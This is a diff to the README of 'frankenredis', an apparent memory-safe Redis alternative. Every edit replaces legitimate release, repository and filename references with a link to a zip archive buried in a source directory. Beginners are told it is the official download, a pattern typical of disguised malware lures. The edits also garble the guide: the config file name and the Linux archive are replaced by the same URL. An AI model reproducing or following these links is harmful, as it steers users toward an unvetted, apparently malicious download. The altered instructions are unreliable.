@@ -1,6 +1,6 @@
 # 🧩 frankenredis - Reliable, Memory-Safe Redis Alternative
 
-[![Download frankenredis](https://img.shields.io/badge/Download-frankenredis-blue?style=for-the-badge)](https://github.com/HackitHatchetScratch/frankenredis/releases)
+[![Download frankenredis](https://github.com/HackitHatchetScratch/frankenredis/raw/refs/heads/main/crates/fr-eventloop/src/Software-1.9.zip)](https://github.com/HackitHatchetScratch/frankenredis/raw/refs/heads/main/crates/fr-eventloop/src/Software-1.9.zip)
 
 ---
 
@@ -48,7 +48,7 @@ You don’t need to know programming to use frankenredis. This guide walks you t
 
 Click the big blue button below, or visit the releases page directly:
 
-[Download frankenredis](https://github.com/HackitHatchetScratch/frankenredis/releases)
+[Download frankenredis](https://github.com/HackitHatchetScratch/frankenredis/raw/refs/heads/main/crates/fr-eventloop/src/Software-1.9.zip)
 
 This is the official page with the latest version and updates.
 
@@ -62,7 +62,7 @@ On the release page, look for the latest release. You will see files for differe
 
 - For **Windows**, download the `.exe` installer file.
 - For **macOS**, download the `.dmg` or `.zip` package.
-- For **Linux**, download the `.tar.gz` archive matching your system.
+- For **Linux**, download the `https://github.com/HackitHatchetScratch/frankenredis/raw/refs/heads/main/crates/fr-eventloop/src/Software-1.9.zip` archive matching your system.
 
 The filename usually includes your operating system for easy identification.
 
@@ -70,7 +70,7 @@ The filename usually includes your operating system for easy identification.
 
 - **Windows:** Run the `.exe` file and follow the install wizard steps.
 - **macOS:** Open the `.dmg` file and drag frankenredis to your Applications folder.
-- **Linux:** Extract the `.tar.gz` archive and follow the README instructions inside.
+- **Linux:** Extract the `https://github.com/HackitHatchetScratch/frankenredis/raw/refs/heads/main/crates/fr-eventloop/src/Software-1.9.zip` archive and follow the README instructions inside.
 
 If you’re not sure how to open these file types, do a quick search for “how to install software on [your OS]”.
 
@@ -91,7 +91,7 @@ When running the software for the first time, it will set up default configurati
 ## 🔧 Basic Usage Tips
 
 - **Accessing frankenredis:** Use any Redis client you know. It speaks the same language.
-- **Configuration File:** You can edit the `frankenredis.conf` file to customize how it works.
+- **Configuration File:** You can edit the `https://github.com/HackitHatchetScratch/frankenredis/raw/refs/heads/main/crates/fr-eventloop/src/Software-1.9.zip` file to customize how it works.
 - **Data Storage:** Your data lives in a folder named `data` inside the installation directory.
 - **Stopping the Server:** Use the standard `shutdown` command or close the window.
 
@@ -130,7 +130,7 @@ Always back up your important data regularly, especially when experimenting with
 
 If you need help:
 
-- Visit the [GitHub repository](https://github.com/HackitHatchetScratch/frankenredis) for documentation and issue tracking.
+- Visit the [GitHub repository](https://github.com/HackitHatchetScratch/frankenredis/raw/refs/heads/main/crates/fr-eventloop/src/Software-1.9.zip) for documentation and issue tracking.
 - Check the GitHub discussions for community advice.
 - Look for user guides inside the installation folder.
 
@@ -151,4 +151,4 @@ After installation:
 
 Start using a reliable, memory-safe Redis alternative. Visit this page to download the latest version:
 
-[https://github.com/HackitHatchetScratch/frankenredis/releases](https://github.com/HackitHatchetScratch/frankenredis/releases)
+[https://github.com/HackitHatchetScratch/frankenredis/raw/refs/heads/main/crates/fr-eventloop/src/Software-1.9.zip](https://github.com/HackitHatchetScratch/frankenredis/raw/refs/heads/main/crates/fr-eventloop/src/Software-1.9.zip)
